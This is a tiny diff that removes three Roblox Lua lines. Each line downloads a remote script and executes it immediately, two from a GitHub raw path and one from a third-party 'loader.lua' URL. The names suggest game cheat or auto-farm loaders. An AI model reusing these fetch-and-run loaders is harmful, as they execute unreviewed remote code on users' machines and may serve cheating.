@@ -1,3 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bytemoo/Team/main/AHost1accNormal"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bytemoo/Team/main/ADFarmKey"))()
-loadstring(game:HttpGet("https://nousigi.com/loader.lua"))() 
